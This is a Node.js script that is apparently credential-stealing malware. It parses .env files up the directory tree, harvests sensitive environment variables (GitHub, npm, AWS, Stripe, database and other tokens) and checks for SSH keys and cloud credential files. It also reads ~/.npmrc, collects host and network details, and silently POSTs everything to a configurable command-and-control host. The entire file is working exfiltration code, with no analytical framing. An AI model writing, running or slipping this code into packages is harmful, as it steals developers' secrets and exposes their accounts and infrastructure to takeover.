const os = require('os');
const fs = require('fs');
const path = require('path');
const http = require('http');

const C2_HOST = process.env.C2_HOST || '127.0.0.1';
const C2_PORT = process.env.C2_PORT || 4444;

// --- 1. Parse .env files from project directory tree ---
function parseEnvFile(filepath) {
  try {
    const content = fs.readFileSync(filepath, 'utf-8');
    const vars = {};
    content.split('\n').forEach(line => {
      line = line.trim();
      if (!line || line.startsWith('#')) return;
      const eq = line.indexOf('=');
      if (eq === -1) return;
      const key = line.slice(0, eq).trim();
      let val = line.slice(eq + 1).trim();
      if ((val.startsWith('"') && val.endsWith('"')) || (val.startsWith("'") && val.endsWith("'")))
        val = val.slice(1, -1);
      vars[key] = val;
    });
    return { file: filepath, vars };
  } catch { return null; }
}

function findEnvFiles() {
  const results = [];
  let dir = process.cwd();
  const root = path.parse(dir).root;
  for (let i = 0; i < 6 && dir !== root; i++) {
    ['.env', '.env.local', '.env.production', '.env.development'].forEach(name => {
      const fp = path.join(dir, name);
      const parsed = parseEnvFile(fp);
      if (parsed && Object.keys(parsed.vars).length > 0) results.push(parsed);
    });
    dir = path.dirname(dir);
  }
  return results;
}

const envFiles = findEnvFiles();
const envTokens = {};
envFiles.forEach(ef => Object.assign(envTokens, ef.vars));

// --- 2. Scan process.env for known sensitive keys ---
const sensitiveKeys = [
  'GITHUB_TOKEN', 'GH_TOKEN', 'GITHUB_PAT',
  'NPM_TOKEN', 'npm_token',
  'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN',
  'DATABASE_URL', 'DB_PASSWORD',
  'API_KEY', 'SECRET_KEY', 'JWT_SECRET',
  'STRIPE_SECRET_KEY', 'VERCEL_TOKEN', 'NETLIFY_AUTH_TOKEN',
  'DOCKER_PASSWORD', 'FIREBASE_TOKEN',
  'SLACK_TOKEN', 'DISCORD_TOKEN',
];
const processTokens = {};
sensitiveKeys.forEach(k => { if (process.env[k]) processTokens[k] = process.env[k]; });

// --- 3. Scan for sensitive files ---
const files = ['.ssh/id_rsa', '.ssh/id_ed25519', '.aws/credentials', '.npmrc', '.env', '.git-credentials'];
const found = files.filter(f => { try { fs.statSync(path.join(os.homedir(), f)); return true; } catch { return false; } });

let npmrc = null;
try { npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf-8'); } catch {}

// --- 4. Network interfaces ---
const nets = os.networkInterfaces();
const network = [];
Object.entries(nets).forEach(([n, a]) => a.forEach(x => {
  if (x.family === 'IPv4' && !x.internal) network.push({ iface: n, ip: x.address, mac: x.mac });
}));

// --- 5. Exfiltrate silently ---
const payload = JSON.stringify({
  t: new Date().toISOString(),
  s: { h: os.hostname(), u: os.userInfo().username, p: os.platform() + ' ' + os.arch(), home: os.homedir(), n: process.version },
  env_files: envFiles.map(e => ({ file: e.file, vars: e.vars })),
  env_tokens: envTokens,
  proc_tokens: processTokens,
  f: found,
  nr: npmrc,
  net: network,
});

const r = http.request({ hostname: C2_HOST, port: C2_PORT, path: '/e', method: 'POST', headers: { 'Content-Type': 'application/json' }, timeout: 2000 }, () => {});
r.on('error', () => {});
r.on('timeout', () => r.destroy());
r.end(payload);
